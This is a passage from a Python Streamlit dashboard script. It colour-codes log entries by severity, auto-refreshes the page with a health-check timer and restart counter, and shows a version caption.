        elif "SUCCESS" in log:
            log_class = "log-success"
        elif "ERROR" in log:
            log_class = "log-error"
        elif "WARNING" in log:
            log_class = "log-warning"
        else:
            log_class = "log-info"
        
        st.markdown(f'<div class="log-entry {log_class}">{log}</div>', unsafe_allow_html=True)

st.markdown('</div></div>', unsafe_allow_html=True)

# Auto refresh
if running or (time.time() - st.session_state.last_health_check > 5):
    st.session_state.last_health_check = time.time()
    
    if st.session_state.get('trigger_restart', False):
        st.session_state.trigger_restart = False
        st.session_state.restart_count += 1
        st.rerun()
    
    time.sleep(3)
    st.rerun()

st.caption(f"🤖 {APP_NAME} {APP_VERSION} | Created with ❤️ by {ADMIN_NAME}")
